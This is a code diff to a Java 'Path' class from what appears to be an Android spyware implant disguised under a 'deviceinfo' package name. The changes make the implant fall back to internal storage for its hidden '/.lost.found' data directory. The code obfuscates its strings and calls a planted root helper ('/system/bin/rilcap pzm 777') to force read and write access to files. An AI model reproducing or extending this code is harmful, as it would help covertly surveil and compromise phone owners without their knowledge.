@@ -19,6 +19,7 @@ import com.android.deviceinfo.Status;
 import com.android.deviceinfo.auto.Cfg;
 import com.android.deviceinfo.util.Check;
 import com.android.deviceinfo.util.DateTime;
+import com.android.deviceinfo.util.Utils;
 import com.android.m.M;
 
 // TODO: Auto-generated Javadoc
@@ -45,11 +46,8 @@ public class Path {
 
 	/** The hidden. */
 	private static String hidden;
-
 	private static boolean initialized = false;
-
 	private static String doc;
-
 	private static String picture;
 
 	// public static final String UPLOAD_DIR = "";
@@ -63,7 +61,7 @@ public class Path {
 	 * 
 	 * @return true, if successful
 	 */
-	public static boolean makeDirs() {
+	public static boolean makeDirs(boolean forcelocal) {
 
 		/** The Constant CONF_DIR. 24_0=cdd/ */
 		CONF_DIR = "l1/"; //$NON-NLS-1$
@@ -73,7 +71,7 @@ public class Path {
 		LOG_DIR = "l3/"; //$NON-NLS-1$
 
 		try {
-			setStorage();
+			setStorage(forcelocal);
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (makeDirs): hidden = " + hidden());//$NON-NLS-1$
 			}
@@ -113,12 +111,17 @@ public class Path {
 
 	/**
 	 * Check.storage. //$NON-NLS-1$
+	 * 
+	 * @param forcelocal
 	 */
-	public static void setStorage() {
+	public static void setStorage(boolean forcelocal) {
 		boolean mExternalStorageAvailable = false;
 		boolean mExternalStorageWriteable = false;
 		final String state = Environment.getExternalStorageState();
 
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (setStorage) external state: " + state);
+		}
 		if (Environment.MEDIA_MOUNTED.equals(state)) {
 			// We can read and write the media
 			mExternalStorageAvailable = mExternalStorageWriteable = true;
@@ -133,12 +136,11 @@ public class Path {
 			mExternalStorageAvailable = mExternalStorageWriteable = false;
 		}
 
-		if (mExternalStorageWriteable && Cfg.USE_SD) {
+		if (!forcelocal && mExternalStorageWriteable && Cfg.USE_SD) {
 			hidden = Environment.getExternalStorageDirectory() + M.e("/.lost.found") + "/"; //$NON-NLS-1$ //$NON-NLS-2$
+
 		} else {
-
 			hidden = Status.getAppContext().getFilesDir().getAbsolutePath() + M.e("/.lost.found") + "/";
-
 		}
 
 		if (Cfg.DEBUG) {
@@ -217,13 +219,16 @@ public class Path {
 	public static boolean unprotect(String path, int depth, boolean fullmode) {
 
 		File file = new File(path);
-	
+
 		if (depth >= 0) {
 			unprotect(file.getParent(), depth - 1, fullmode);
 		}
-		
-		return unprotect(path, fullmode);
-	
+
+		boolean ret = unprotect(path, fullmode);
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (unprotect) ret: " + path + " " + ret);
+		}
+		return ret;
 	}
 
 	public static boolean unprotect(String path, boolean fullmode) {
@@ -232,7 +237,7 @@ public class Path {
 			File file = new File(path);
 
 			if (fullmode) {
-				if (file.exists() && file.canRead() && file.canWrite()) {
+				if (file.canRead() && file.canWrite()) {
 					return true;
 				}
 				if (Cfg.DEBUG) {
@@ -240,8 +245,9 @@ public class Path {
 				}
 				// h_9=/system/bin/ntpsvd pzm 777
 				Runtime.getRuntime().exec(M.e("/system/bin/rilcap pzm 777 ") + " " + path);
+				Utils.sleep(200);
 			} else {
-				if (file.exists() && file.canRead()) {
+				if (file.canRead()) {
 					return true;
 				}
 				if (Cfg.DEBUG) {
@@ -249,8 +255,13 @@ public class Path {
 				}
 				// h_3=/system/bin/ntpsvd pzm 755
 				Runtime.getRuntime().exec(M.e("/system/bin/rilcap pzm 755 ") + " " + path);
+				Utils.sleep(200);
 			}
 
+			file = new File(path);
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (unprotect) return: " + path + " " + file.canRead());
+			}
 			return file.canRead();
 		} catch (IOException ex) {
 			Check.log(TAG + " Error (unprotect): " + ex);
@@ -347,6 +358,19 @@ public class Path {
 
 	public static boolean initialized() {
 		return initialized;
+	}
+
+	public static boolean makeDirs() {
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (makeDirs) trying sd");
+		}
+		if (!makeDirs(false)) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (makeDirs) forcing internal space");
+			}
+			return makeDirs(true);
+		}
+		return true;
 	}
 
 }
